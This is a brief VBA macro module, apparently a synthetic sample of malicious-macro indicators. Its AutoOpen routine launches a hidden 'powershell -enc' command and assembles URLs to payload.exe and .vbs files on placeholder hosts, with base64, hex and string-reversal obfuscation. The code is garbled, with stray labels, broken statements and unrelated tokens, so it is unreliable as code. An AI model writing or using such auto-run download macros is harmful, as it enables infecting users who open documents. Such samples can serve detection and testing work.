Attribute VB_Name = "Module1"
Sub AutoOpen()
  x = CreateObject("WScript.Shell").Run("powershell -enc 4D5A9000 aHR0cDovL2V4YW1wbGUuY29tL3g=")
  y = "http://example.com/payload.exe" & "http://192.0.2.1:8080/a b.vbs"
  z = "VGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4=" & "68747470733a2f2f6578616d706c652e6f72672f"
  a = StrReverse("6578652e") & Chr(65) & "ab" & vbHide & ""
  Button1_Click: Workbook_Open
  .Variables("a")
End Sub
при Shell Kill exeć EnumDateFormatsExEx a@b.example admin@EXAMPLE.org
